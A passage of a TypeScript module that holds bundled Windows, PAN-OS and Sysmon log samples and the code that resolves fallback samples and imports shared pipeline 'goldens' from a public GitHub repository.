    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>12545</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>556679</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='TargetUserSid'>S-1-5-21-1004336348-1177238915-682003330-1013</Data><Data Name='TargetUserName'>jdoe</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetLogonId'>0x1a2b3c</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12548</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>556680</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1004336348-1177238915-682003330-500</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7abc</Data><Data Name='PrivilegeList'>SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>556681</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='TargetUserName'>svc_backdoor</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetSid'>S-1-5-21-1004336348-1177238915-682003330-2001</Data><Data Name='SubjectUserSid'>S-1-5-21-1004336348-1177238915-682003330-500</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7abc</Data><Data Name='SamAccountName'>svc_backdoor</Data><Data Name='DisplayName'>%%1793</Data></EventData></Event>`,
  ],
  // PAN-OS SYSTEM logs — CSV behind a BSD syslog header; the prefix glues into the
  // discarded first column so named columns still align. SYSTEM = device/operational
  // trail (auth daemon, config commit, HA, routing) — data class 'audit'.
  palo_alto_system: [
    `Sep 15 08:14:22 PA-3220 1,2026/09/15 08:14:22,007051000012345,SYSTEM,auth,0,2026/09/15 08:14:22,vsys1,auth-success,,0,0,auth,informational,"User admin authenticated successfully. From: 10.20.1.50. Auth mode: normal.",4455661,0x0,0,0,0,0,vsys1,PA-3220`,
    `Sep 15 08:15:03 PA-3220 1,2026/09/15 08:15:03,007051000012345,SYSTEM,auth,0,2026/09/15 08:15:03,vsys1,auth-fail,,0,0,auth,medium,"failed authentication for user 'operator'. Reason: Invalid username/password. From: 203.0.113.44.",4455662,0x0,0,0,0,0,vsys1,PA-3220`,
    `Sep 15 08:20:41 PA-3220 1,2026/09/15 08:20:41,007051000012345,SYSTEM,general,0,2026/09/15 08:20:41,,general,,0,0,general,informational,"Config committed by admin. Commit description: update security rules.",4455663,0x0,0,0,0,0,,PA-3220`,
    `Sep 15 08:31:10 PA-3220 1,2026/09/15 08:31:10,007051000012345,SYSTEM,ha,0,2026/09/15 08:31:10,,ha-state,,0,0,ha,high,"HA Group 1: Local device changed state from active to passive. Reason: preemption.",4455664,0x0,0,0,0,0,,PA-3220`,
    `Sep 15 08:45:57 PA-3220 1,2026/09/15 08:45:57,007051000012345,SYSTEM,routing,0,2026/09/15 08:45:57,vsys1,routed-bgp,,0,0,routing,informational,"BGP peer 198.51.100.2 state changed to Established.",4455665,0x0,0,0,0,0,vsys1,PA-3220`,
    `Sep 15 09:02:13 PA-3220 1,2026/09/15 09:02:13,007051000012345,SYSTEM,general,0,2026/09/15 09:02:13,,dnl-update,,0,0,general,informational,"Content version 8811-8102 downloaded and installed successfully.",4455666,0x0,0,0,0,0,,PA-3220`,
  ],
  windows_sysmon: [
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:18.661792800Z\'/><EventRecordID>8</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:18.572</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3A-5FA1-EF02-000000008701}</Data><Data Name=\'ProcessId\'>4940</Data><Data Name=\'Image\'>C:\\Windows\\System32\\wbem\\unsecapp.exe</Data><Data Name=\'FileVersion\'>10.0.14393.2515 (rs1_release_1.180830-1044)</Data><Data Name=\'Description\'>Sink to receive asynchronous callbacks for WMI client application</Data><Data Name=\'Product\'>Microsoft® Windows® Operating System</Data><Data Name=\'Company\'>Microsoft Corporation</Data><Data Name=\'OriginalFileName\'>unsecapp.dll</Data><Data Name=\'CommandLine\'>C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding</Data><Data Name=\'CurrentDirectory\'>C:\\Windows\\system32\\</Data><Data Name=\'User\'>NT AUTHORITY\\SYSTEM</Data><Data Name=\'LogonGuid\'>{D28789B6-7ACF-5FA1-E703-000000000000}</Data><Data Name=\'LogonId\'>0x3e7</Data><Data Name=\'TerminalSessionId\'>0</Data><Data Name=\'IntegrityLevel\'>System</Data><Data Name=\'Hashes\'>MD5=2E49BB6C9F6599F518FE30BE2F000247,SHA256=20F499D581CF4AF331D8EC8B1E07A32CC1A695EF6790B51DA5EE223C5867154F,IMPHASH=A3CC49DF67C2278F822C9EBB9908BF09</Data><Data Name=\'ParentProcessGuid\'>{D28789B6-7AD1-5FA1-0C00-000000008701}</Data><Data Name=\'ParentProcessId\'>572</Data><Data Name=\'ParentImage\'>C:\\Windows\\System32\\svchost.exe</Data><Data Name=\'ParentCommandLine\'>C:\\Windows\\system32\\svchost.exe -k DcomLaunch</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:51:30.816263300Z\'/><EventRecordID>2414</EventRecordID><Correlation/><Execution ProcessID=\'2152\' ThreadID=\'3472\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>Usermode</Data><Data Name=\'UtcTime\'>2020-11-03 15:51:28.673</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C6B-5FA1-2700-000000008801}</Data><Data Name=\'ProcessId\'>2324</Data><Data Name=\'Image\'>C:\\Users\\Public\\splunkd.exe</Data><Data Name=\'User\'>NT AUTHORITY\\SYSTEM</Data><Data Name=\'Protocol\'>tcp</Data><Data Name=\'Initiated\'>true</Data><Data Name=\'SourceIsIpv6\'>false</Data><Data Name=\'SourceIp\'>10.0.1.14</Data><Data Name=\'SourceHostname\'>win-dc-807.attackrange.local</Data><Data Name=\'SourcePort\'>49694</Data><Data Name=\'SourcePortName\'>-</Data><Data Name=\'DestinationIsIpv6\'>false</Data><Data Name=\'DestinationIp\'>10.0.1.12</Data><Data Name=\'DestinationHostname\'>-</Data><Data Name=\'DestinationPort\'>7010</Data><Data Name=\'DestinationPortName\'>-</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:19.884998500Z\'/><EventRecordID>93</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:19.873</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3B-5FA1-F302-000000008701}</Data><Data Name=\'ProcessId\'>4920</Data><Data Name=\'Image\'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\'TargetFilename\'>C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xzdyha4l.i4c.ps1</Data><Data Name=\'CreationUtcTime\'>2020-11-03 15:50:19.873</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:22.605527200Z\'/><EventRecordID>287</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'EventType\'>SetValue</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:22.591</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3D-5FA1-FC02-000000008701}</Data><Data Name=\'ProcessId\'>4720</Data><Data Name=\'Image\'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\'TargetObject\'>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\\MaxSize</Data><Data Name=\'Details\'>DWORD (0x12d2c000)</Data></EventData></Event>',
  ],
};

// Raw sourcetype (as the wizard sends it) → canonical BUNDLED_FALLBACK_SAMPLES key.
// Mirrors FALLBACK_KEY_ALIASES in scripts/reference-api.mjs — lets buildable
// golden-path sources reach their deterministic seed without touching
// sourcetype canonicalization.
const BUNDLED_FALLBACK_KEY_ALIASES: Record<string, string> = {
  'f5:bigip:syslog': 'f5_bigip',
  'f5_bigip_syslog': 'f5_bigip',
  'access_combined': 'apache_access',
  'access_combined_wcookie': 'apache_access',
  'access_log': 'apache_access',
  'apache_access': 'apache_access',
  'infoblox:port': 'infoblox_port',
};

function resolveEntries(sourcetype: string): { key: string; entry: any }[] {
  const st = (sourcetype || '').toLowerCase().trim();
  if (!st) return [];
  const catalog = referenceCatalog as any;
  if (!catalog?.sourcetypes) return [];
  const patterns = SOURCETYPE_ALIASES[st] || [st];
  const blockSamples = CORRUPT_SAMPLE_SOURCETYPES.has(st);
  const matches: { key: string; entry: any }[] = [];
  for (const [key, entry] of Object.entries(catalog.sourcetypes)) {
    const kl = key.toLowerCase();
    if (patterns.some(p => kl.includes(p))) {
      if ((blockSamples || isCorruptSampleKey(key)) && ((entry as any).samples || []).length) {
        matches.push({ key, entry: { ...(entry as any), samples: [] } });
      } else {
        matches.push({ key, entry: withBundledSamples(entry) });
      }
    }
  }
  if (matches.length === 0 && (catalog.sourcetypes as any)[st]) {
    matches.push({ key: st, entry: withBundledSamples((catalog.sourcetypes as any)[st]) });
  }
  return matches;
}

function mergeEntries(matches: { key: string; entry: any }[]) {
  const fields = new Set<string>();
  const samples: any[] = [];
  const transformations: Record<string, unknown> = {};
  const optimizations = new Set<string>();
  let pack: string | null = null;
  for (const { entry } of matches) {
    (entry.extractionFields || []).forEach((f: string) => fields.add(f));
    (entry.samples || []).forEach((s: any) => samples.push(s));
    Object.assign(transformations, entry.transformations || {});
    (entry.optimizations || []).forEach((o: string) => optimizations.add(o));
    if (!pack && entry.pack) pack = entry.pack;
  }
  const withSamples = matches.find(m => (m.entry.samples || []).length > 0);
  if (withSamples) pack = withSamples.entry.pack;
  return { pack, fields: [...fields], samples, transformations: Object.keys(transformations), optimizations: [...optimizations] };
}

// --- Public API ---

export function getBundledCatalog() {
  const catalog = referenceCatalog as any;
  if (!catalog?.sourcetypes) return { sourcetypes: {}, total: 0 };
  const slim: Record<string, any> = {};
  for (const [st, entry] of Object.entries(catalog.sourcetypes) as [string, any][]) {
    const samples = (entry.samples || []).filter((sample: any) => Boolean(bundledSampleLoader(sample)));
    if (samples.length > 0 || entry.extractionFields?.length > 0) {
      slim[st] = {
        pack: entry.pack,
        displayName: entry.displayName,
        hasSamples: samples.length > 0,
        sampleCount: samples.length,
        fields: entry.extractionFields?.length || 0,
        transformations: Object.keys(entry.transformations || {}),
        optimizations: entry.optimizations || [],
      };
    }
  }
  return { sourcetypes: slim, total: Object.keys(slim).length };
}

export function getBundledAvailability() {
  const availability: Record<string, any> = {};
  for (const st of Object.keys(SOURCETYPE_ALIASES)) {
    const merged = mergeEntries(resolveEntries(st));
    const sampleEvents = merged.samples.reduce((n: number, s: any) => n + (s.events || 0), 0);
    availability[st] = {
      hasSamples: merged.samples.length > 0,
      sampleEvents,
      fields: merged.fields.length,
      transformations: merged.transformations,
      optimizations: merged.optimizations,
      pack: merged.pack,
    };
  }
  // Union in sourcetypes whose only sample lives in a fallback store (vendor /
  // source / ai / sanitised) — otherwise the wizard offers AI-only for them even
  // though resolveFallbackSample would resolve a real sample. See storeBackedAvailability.
  const storeBacked = storeBackedAvailability({
    vendorIndex: vendorSampleIndex as any,
    aiIndex: aiSampleIndex as any,
    sanitisedIndex: sanitisedSampleIndex as any,
    sourceSamples: sourceSamplesData as any,
  });
  for (const [st, s] of storeBacked) {
    if (availability[st]?.hasSamples) continue;
    availability[st] = {
      hasSamples: true, sampleEvents: s.sampleEvents,
      fields: 0, transformations: [], optimizations: [], pack: s.pack,
    };
  }
  return { availability };
}

function getSourceSampleFallback(st: string): { available: boolean; events?: string[]; sourcetype?: string; pack?: string; fields?: string[]; sampleName?: string } | null {
  const samples = sourceSamplesData as Record<string, { sourcetype?: string; example_logs?: string[]; fields?: string[] }>;
  // Entries our own parser cannot read are skipped, not served: this store
  // outranks every later tier, so a broken entry shadows the good sample behind it
  // and the pack silently extracts nothing (src/sample-library.ts).
  const hit = (k: string) => {
    const entry = samples[k];
    if (!entry?.example_logs?.length || UNREADABLE_SOURCE_SAMPLES.has(k)) return null;
    return {
      available: true,
      events: entry.example_logs,
      sourcetype: entry.sourcetype || st,
      pack: 'source-samples',
      fields: entry.fields,
      sampleName: `${st}_reference`,
    };
  };
  // Try exact match first, then try colon-normalized key
  const key = st.replace(/:/g, '_');
  for (const k of [st, key]) {
    const found = hit(k);
    if (found) return found;
  }
  // Try alias patterns
  const aliases = SOURCETYPE_ALIASES[st];
  if (aliases) {
    for (const alias of aliases) {
      for (const k of [alias, alias.replace(/:/g, '_')]) {
        const found = hit(k);
        if (found) return found;
      }
    }
  }
  return null;
}

interface ResolvedSample {
  available: boolean;
  events?: unknown[];
  sourcetype?: string;
  pack?: string;
  fields?: string[];
  sampleName?: string;
  /** True for AI-generated content, so callers can distinguish it from real logs. */
  synthetic?: boolean;
  verification?: AiSampleDoc['verification'] | null;
  /** How strongly a harvested vendor sample could be checked. */
  confidence?: VendorSampleDoc['confidence'] | null;
  /** Upstream provenance of a harvested sample — required to stay attached. */
  upstream?: VendorSampleDoc['upstream'] | null;
  /** Real-format customer data with identifying values replaced locally. */
  sanitised?: boolean;
}

/** Load a verified AI-generated sample from the committed library, if present. */
async function getAiLibrarySample(st: string, format?: string): Promise<ResolvedSample | null> {
  // Same key order as the vendor store, aliases included: a source named with the
  // collecting team's prefix must reach a sample filed under the vendor's own name in
  // EITHER store, or the prefix alone decides whether a sample is found.
  const candidates = sampleStoreKeys(st, format);
  for (const key of candidates) {
    // The index gate matters: without it every miss would try a dynamic import
    // that Vite resolved at build time to nothing, which throws rather than
    // returning undefined.
    if (!AI_SAMPLE_KEYS.has(key)) continue;
    const loader = aiSampleModules[`../config/ai-samples/${aiSampleKeyToFile(key)}`];
    if (!loader) continue;
    try {
      const mod = await loader();
      const doc = ((mod as { default?: unknown }).default ?? mod) as AiSampleDoc;
      if (doc?.events?.length) {
        return {
          available: true,
          events: doc.events,
          sourcetype: doc.sourcetype,
          pack: 'ai-samples',
          fields: doc.verification?.fields || [],
          sampleName: `${doc.sourcetype}_ai_sample`,
          synthetic: true,
          verification: doc.verification || null,
        };
      }
    } catch { /* a library file that won't load is simply not a hit */ }
  }
  return null;
}

/**
 * Load a harvested real vendor sample from the samples pool, if present.
 *
 * Index-gated exactly as before, so an absent sourcetype still costs no request;
 * only the body moved from a bundled chunk to a credential-free public read. Any
 * failure returns null and resolution falls through to the next tier — an
 * unreachable pool must never fail a build.
 */
async function getVendorLibrarySample(st: string, format?: string): Promise<ResolvedSample | null> {
  const doc = await resolvePoolSample(sampleStoreKeys(st, format), k => VENDOR_SAMPLE_KEYS.has(k));
  return toPoolSampleResponse(doc);
}

async function getSanitisedLibrarySample(st: string, format?: string): Promise<ResolvedSample | null> {
  const bundled: Record<string, SanitisedSampleDoc> = {};
  const candidates = sampleStoreKeys(st, format);
  for (const key of candidates) {
    if (!SANITISED_SAMPLE_KEYS.has(key)) continue;
    const loader = sanitisedSampleModules[`../config/sanitised-samples/${aiSampleKeyToFile(key)}`];
    if (!loader) continue;
    try {
      const mod = await loader();
      const doc = parseSanitisedSampleDoc((mod as { default?: unknown }).default ?? mod);
      if (doc) bundled[key] = doc;
    } catch { /* malformed bundled document is not a hit */ }
  }
  const store = mergeSanitisedOverlay(bundled, await loadSanitisedOverlay());
  for (const key of candidates) {
    const doc = store[key];
    if (!doc?.events?.length) continue;
    return {
      available: true,
      events: doc.events,
      sourcetype: doc.sourcetype,
      pack: 'sanitised-samples',
      fields: doc.verification.fields || [],
      sampleName: `${doc.sourcetype}_sanitised_sample`,
      synthetic: false,
      verification: doc.verification,
      sanitised: true,
    };
  }
  return null;
}

/**
 * The fallback tier chain, in trust order — the iframe mirror of
 * `resolveFallbackSample` in scripts/reference-api.mjs (Hard Rule 18). Both had
 * the same two tiers duplicated three-to-five times inline; adding the AI tier to
 * every copy by hand is exactly how the two modes drift, so each mode now has one
 * function and the two are kept side by side.
 *
 *   1. BUNDLED_FALLBACK_SAMPLES  curated static seeds
 *   2. source-samples.json       real vendor logs, hand-curated set
 *   3. the samples pool         real vendor logs harvested from an upstream corpus
 *   4. config/sanitised-samples/ parser-validated pseudonymised real events
 *   5. config/ai-samples/        verified AI-generated  ← synthetic, so last
 */
async function resolveFallbackSample(st: string, format?: string): Promise<ResolvedSample> {
  const fallback = BUNDLED_FALLBACK_SAMPLES[st];
  if (fallback) return { available: true, events: fallback, sourcetype: st, pack: 'fallback', sampleName: `${st}_fallback` };
  const refFallback = getSourceSampleFallback(st);
  if (refFallback) return refFallback;
  const vendor = await getVendorLibrarySample(st, format);
  if (vendor) return vendor;
  const sanitised = await getSanitisedLibrarySample(st, format);
  if (sanitised) return sanitised;
  const ai = await getAiLibrarySample(st, format);
  if (ai) return ai;
  return { available: false };
}

// Resolve catalog entries by an explicit pattern list (used for Windows channel
// routing, where the raw channel string — not a canonical alias — picks samples).
function resolveEntriesByPatterns(patterns: string[]): { key: string; entry: any }[] {
  const catalog = referenceCatalog as any;
  if (!catalog?.sourcetypes) return [];
  const lc = patterns.map(p => p.toLowerCase());
  const matches: { key: string; entry: any }[] = [];
  for (const [key, entry] of Object.entries(catalog.sourcetypes)) {
    const kl = key.toLowerCase();
    if (lc.some(p => kl.includes(p))) matches.push({ key, entry: withBundledSamples(entry) });
  }
  return matches;
}

export async function getBundledSample(sourcetype: string, format?: string): Promise<ResolvedSample> {
  // An explicit XSIAM CEF choice is destination knowledge, not a generic sample
  // lookup. It must beat native KVP/syslog catalog samples for the same product.
  if (format?.toLowerCase() === 'cef') {
    const xsiamCef = getXsiamCefSample(sourcetype);
    if (xsiamCef) return xsiamCef;
  }
  const stNorm = (sourcetype || '').toLowerCase().trim();
  // *nix family routing takes precedence for bare /var/log names; Windows channel
  // routing for wineventlog channels. Both are RAW-string routers (not canonical).
  const linuxFamily = resolveLinuxFamily(stNorm);
  const channel = linuxFamily ? null : resolveWindowsChannel(stNorm);
  const route = linuxFamily || channel;
  let matches = route ? resolveEntriesByPatterns(route.patterns) : resolveEntries(sourcetype);
  // If a Windows channel produced no loadable catalog sample, fall back to its
  // default canonical resolution (generic Security). *nix families deliberately
  // resolve via BUNDLED_FALLBACK only (patterns:[]) — never default to Windows.
  if (channel && !matches.some(m => (m.entry.samples || []).length > 0)) {
    matches = resolveEntries(channel.fallback || 'windows_security');
  }
  // Key used for BUNDLED_FALLBACK / source-samples lookups when no catalog file
  // loads — a route maps to its own fallback (e.g. windows_sysmon, linux_dnf), not
  // the raw string (which no fallback table is keyed by).
  const rawFbKey = (route?.fallback || sourcetype || '').toLowerCase().trim();
  const fbKey = BUNDLED_FALLBACK_KEY_ALIASES[rawFbKey] || rawFbKey;
  const merged = mergeEntries(matches);
  const best = [...merged.samples].sort((a, b) => (b.events || 0) - (a.events || 0))[0];
  if (!best?.file) {
    return await resolveFallbackSample(fbKey, format);
  }

  // Find the matching lazy module
  const loader = bundledSampleLoader(best);
  if (!loader) {
    return await resolveFallbackSample(fbKey, format);
  }

  const mod = await loader();
  const events = (mod as any).default ?? mod;
  if (!Array.isArray(events) || events.length < 3) {
    // A catalog sample this thin is worse than a fallback, but only swap if a
    // fallback actually exists — otherwise keep the 1-2 events we have.
    const thin = await resolveFallbackSample(fbKey, format);
    if (thin.available) return thin;
  }
  return {
    available: true,
    events: Array.isArray(events) ? events : [],
    sourcetype: (sourcetype || '').toLowerCase(),
    pack: merged.pack || undefined,
    fields: merged.fields,
    sampleName: best.name,
  };
}

// Selection is SHARED with standalone and with a Backend Function
// (reference-lookup-select.ts) — only the store is per-mode. This one is Vite's
// eager glob; it used to carry its own copy of the category + network rules and
// had drifted from the standalone copy on both, so the same sourcetype shipped
// different `data/lookups/` depending on where the pack was built.
export function getBundledLookups(sourcetype: string): SelectedReferenceLookup[] {
  return selectReferenceLookups(sourcetype, goldenLookupsIndex as ReferenceLookupIndex, (file) => {
    const csvKey = Object.keys(lookupCsvFiles).find(k => k.endsWith(`/${file}`));
    return csvKey ? lookupCsvFiles[csvKey] : null;
  });
}

/* The safe-storage helpers live in their own module so that reading one cache key does not
   require importing several megabytes of bundled knowledge. Re-exported here because this
   file's own callers have always got them from this path. */
export { safeGetItem, safeSetItem, safeRemoveItem, hasLocalStorage };

// --- GitHub golden sharing (direct browser→GitHub API) ---

const GH_FOLDER = 'shared-goldens';
// A PUBLIC repository holding nothing but goldens. Public because every install
// is allowed to read the pool and none of them should have to be given a
// credential to do it; goldens-only because a token scoped to the app's own
// repository would grant far more than the goldens it was wanted for.
const GOLDEN_REPO = 'wvdlinde-cribl/cribl-pack-goldens';
const GOLDEN_BRANCH = 'shared-goldens';

function goldenKeyToFileName(key: string): string {
  return `${key.replace(/::/g, '__')}.json`;
}

// Reading the pool needs no credential (it is public), so there is none to hand
// out. Kept as a compatibility accessor for call sites that still ask.
export function getGoldenReadToken(): string { return ''; }
export function getGoldenRepo(): string { return GOLDEN_REPO; }
export function getGoldenBranch(): string { return GOLDEN_BRANCH; }

export async function fetchGoldensFromGitHub(repo: string, branch: string, _token = ''): Promise<{ available: any[]; total?: number; error?: string }> {
  const effectiveRepo = repo || GOLDEN_REPO;
  const effectiveBranch = branch || GOLDEN_BRANCH;
  try {
    // ONE conditional request per call, unauthenticated, and normally a free 304 —
    // this runs at every app start in both run modes, so it must cost nothing and
    // must not depend on anybody having configured a credential.
    const resp = await ghReadPublicFile(effectiveRepo, effectiveBranch, `${GH_FOLDER}/index.json`);
    if (resp.status === 404) return { available: [], error: undefined };
    if (!resp.ok) return { available: [], error: `GitHub ${resp.status}` };
    let index: any;
    try { index = JSON.parse(resp.text); } catch { return { available: [], error: 'Invalid index.json' }; }
    const goldensList: any[] = Array.isArray(index.goldens) ? index.goldens : [];
    const total = goldensList.length;
    // Baseline the diff on the bundled corpus, not just localStorage. The idle
    // `seedGoldenDefaults` pass populates `golden::<key>` from this same corpus,
    // but it races this check on startup — and if it has not run yet, every key
    // reads as localScore=null → 'new' → the ENTIRE pool queues for a per-file
    // download it already ships (the raw.githubusercontent 429 storm). Folding
    // the corpus score into the baseline makes the check independent of timing.
    let corpus: Record<string, any> = {};
    try { corpus = (await loadGoldenCorpusBaseline())?.pipelines || {}; } catch { /* corpus optional — degrade to localStorage only */ }
    // Optimization sub-parts are a retired feature (build 778) — stale entries
    // can still linger in the remote pool's index.json from before the
    // retirement, and surfacing them for import would resurrect a feature with
    // no consumer.
    // Goldens imported or built in the sandboxed frame live in App KV, not in
    // localStorage — without them every import is offered again after a reload.
    const kvIndex = await loadGoldenKvIndex().catch(() => ({} as Record<string, number>));
    // Ranked by standing, not score (golden-trust R2/R4): the full local record
    // when it is at hand, else a score-only App KV stand-in, which ranks legacy.
    const available = classifyAvailableGoldensByTrust(goldensList, (key): StoredGolden | null => {
      try { const raw = safeGetItem(`golden::${key}`); if (raw) return JSON.parse(raw); } catch { /* fall through to corpus */ }
      if (corpus[key]) return corpus[key];
      return typeof kvIndex[key] === 'number' ? { functions: [], score: kvIndex[key] } : null;
    }).filter(entry => entry.part !== 'optimization');
    return { available, total };
  } catch (err) {
    return { available: [], error: err instanceof Error ? err.message : 'Failed to fetch goldens' };
  }
}

export async function importGoldensFromGitHub(repo: string, branch: string, token: string, keys: string[]): Promise<{ imported: { key: string; score: number }[]; failed: { key: string; reason: string }[] }> {
  const effectiveToken = token;
  const effectiveRepo = repo || GOLDEN_REPO;
  const effectiveBranch = branch || GOLDEN_BRANCH;
  const imported: { key: string; score: number }[] = [];
  const failed: { key: string; reason: string }[] = [];
  // Batched exactly like the standalone handler: "import all" is 641 keys, which was
  // 641 requests. 100 bodies per GraphQL call, 1 quota point each.
  const byName = new Map(keys.filter(Boolean).map((k) => [goldenKeyToFileName(k), k]));
  let docs: Map<string, any>;
  const readErrors = new Map<string, string>();
  try {
    docs = await ghReadPoolFiles<any>(effectiveRepo, effectiveBranch, effectiveToken, GH_FOLDER, [...byName.keys()], {
      onError: (name, reason) => readErrors.set(name, reason),
    });
  } catch (err) {
    const reason = err instanceof Error ? err.message : 'unknown';
    return { imported: [], failed: keys.map((key) => ({ key, reason })) };
  }
  for (const [name, key] of byName) {
    const data = docs.get(name);
    if (!data) { failed.push({ key, reason: readErrors.get(name) ?? 'Not found in shared goldens' }); continue; }
    try {
      // A mapping filed under `json`/`csv`/… is not knowledge to import. The
      // standalone importer refuses the same keys (golden-source-identity).
      const blocked = nonSourceMappingKeyReason(key);
      if (blocked) { failed.push({ key, reason: blocked }); continue; }
      // The same rule the standalone store runs (planGoldenImport): a legacy pool
      // doc only where nothing is held, an evidenced one only if it outranks the
      // local record, a tombstone never served. This used to write the doc over
      // whatever the install had.
      const existing = await readStoredGolden(key).catch(() => null);
      const plan = planGoldenImport(existing, {
        functions: data.functions, score: data.score || 0, updatedAt: data.updated_at,
        recipe: data.recipe ?? null, report: data.report ?? null, wireFormat: data.wireFormat ?? null,
        evidence: data.evidence ?? null, observations: data.observations ?? [], quarantine: data.quarantine ?? null,
      });
      if (!plan.record) { failed.push({ key, reason: plan.reasons.join('; ') || plan.action }); continue; }
      // A write that only reached the memory fallback is gone on the next reload,
      // and the same golden is offered again — so it is a failure, not an import.
      const saved = await saveGoldenDurably(`golden::${key}`, JSON.stringify(plan.record));
      if (!saved.ok) {
        failed.push({ key, reason: saved.reason });
        continue;
      }
      imported.push({ key, score: plan.record.score ?? data.score ?? 0 });
    } catch (err) {
      failed.push({ key, reason: err instanceof Error ? err.message : 'unknown' });
    }
  }
  return { imported, failed };
}

export async function testGitHubAccess(repo: string, branch: string, _token: string): Promise<{ ok: boolean; message: string }> {
  const effectiveRepo = repo || GOLDEN_REPO;
  const effectiveBranch = branch || GOLDEN_BRANCH;
  try {
    const resp = await ghReadPublicFile(effectiveRepo, effectiveBranch, `${GH_FOLDER}/index.json`, { conditional: false });
    const budget = ghLimitState('core');
    const note = budget && budget.remaining < 100
      ? ` — ⚠ only ${budget.remaining} of ${budget.limit} GitHub API requests left this hour (resets ${new Date(budget.resetAt).toLocaleTimeString()})`
      : '';
    if (resp.ok) {
      const count = (() => { try { return (JSON.parse(resp.text)?.goldens || []).length; } catch { return 0; } })();
